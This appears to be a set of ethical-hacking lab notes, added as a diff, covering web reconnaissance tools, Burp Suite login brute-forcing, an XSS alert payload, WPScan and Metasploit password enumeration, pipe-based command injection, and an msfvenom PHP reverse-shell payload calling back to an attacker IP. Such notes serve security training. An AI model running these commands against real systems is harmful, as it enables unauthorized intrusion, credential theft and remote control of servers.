@@ -1,0 +1,121 @@
+Hacking Web Applications
+
+Methods
+	• SQL injections 
+	• XSS
+	• CSRF
+	• Insecure communication 
+ 
+Lab Tasks
+	1. Footprint the web infrastructure
+	Goal: help understand and identify vulnerable web apps, how they connect with pears and the tech used and find vulnerabilities in specific part of the web app architecture 
+			§ Server Discovery- host/physical discovery
+			§ Service discovery- port/service
+			§ Server identification -banner grabbing
+			§ Hidden contents- hidden functionality 
+      
+		○  Nmap and Telnet: web application reconnaissance using
+			§ Nmap
+				□ Just using the -A option
+			§ Telnet 
+				□ $telnet <www.url.com> <Port#>
+					GET / HTTP/1.0
+					
+		○ WhatWeb: web application reconnaissance  
+			§ $whatweb <target URL/IP>
+				□ -v gives details about plugins
+			§ Identifies websites and the tech behind it 
+			§ Only needs URL
+			
+		○ OWASP ZAP: web spidering  
+			§ $zaproxy
+				Automated scan> URL >Attack
+				Results are in alert tab
+				Spider tab>message tab
+					® URLs tab contains various links for hidden content and functionality associated with the target website
+					® Message tab: provides more info of spider tabs
+					
+		○ Detect load balancers 
+			2 types of load balancers:
+			§ DNS- operates on layer 4
+				$dig <ip>
+			§ Http- operates on layer 7
+				$lbd <target>
+        
+		○ Identify web server directories
+			§ Nmap
+				$--script http-enum: results in directory info
+			§ Gobuster- uses a wordlist to guess directories(brute force).*****
+				$gobuster dir -u <target IP> -w <common.txt>
+					® dir: file brute force mode
+					® -w: directory names list
+			§ Dirsearch(python tool)- 
+				$cd dirsearch
+				$python3 dirsearch.py -u http://<url.com> <options>
+					-e aspx	Finds aspx files
+					-x 403	Performs 403 Brute forcing 
+          
+		○ Vega: web application vulnerability scanning  (win exe)
+			§ Helps find bugs  for SQL, XSS, exposed info /vulnerability
+			Open app> scan > start a new session and keep all of the default settings
+      
+		○ ClickjackPoc: Identify clickjacking vulnerability  
+			§ Lin cmd
+			$cd ClickJackPoc
+			$python3 clickjackpoc.py -f <targetin.txt>
+      
+	2. Perform web application attacks
+		○ Burp Suite: a brute-force attack 
+			1. Setup firefox proxy to local host:8080
+			2. Turn on burp suite
+			3. Make sure that "intercept is On" is blue and perform a [invalid] login attack from.
+			4. Click forward until you see the request( the invalid credentials should be on the last line)
+			5. Right click, send to intruder
+			6. Go to Intruder tab> position subtab> select the values that you want to brute force > click add
+			7. Go to payloads, payload set # and update the txt file
+			8. Start attack
+			
+			
+		○ Burp Suite: parameter tampering 
+			§ When you find a ID=1, go into the query tab
+
+		○ PwnXSS: Identify XSS vulnerabilities in web applications  
+			§ XSS scanner
+			§ $cd PwnXSS
+			§ $python3 pwnxss.py -u http://<target>
+      
+		○ Exploit parameter tampering and XSS vulnerabilities
+			§ Enter name and a script 
+				□ <script>alert("message")<\script>
+		
+		○ Perform cross-site request forgery (CSRF) attack
+			$wpscan --api-token [API Token] --url http://<target>:<port>/ --plugins-detection aggressive --enumerate vp
+				Allows you to finds plugins and executes a CSRF
+			
+		○ Enumerate and hack a web application using WPScan and Metasploit
+			
+			WPScan
+			$wpscan --url <target> -e u 
+				Allows you find users
+			$wpscan --url <> -U <username.txt or username> --passwords <password.txt>
+				Allows you to find passwords with a list of username
+				
+			Metasploit
+				Use wordpress_login_enum
+				Options
+					® PASS_FILE
+					® RHOST
+					® RPORT
+					® TARGETURI
+					® USERNAME 
+				run
+			
+			
+		○ Exploit a remote command execution vulnerability to compromise a target web server
+			In the input box type a PIPE('|") then the command
+			
+		○ Exploit a file upload vulnerability at different security levels
+			1. $msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<port> -f raw
+			2. Upload the contents to a file.php
+		
+Gain access by exploiting Log4j vulnerability
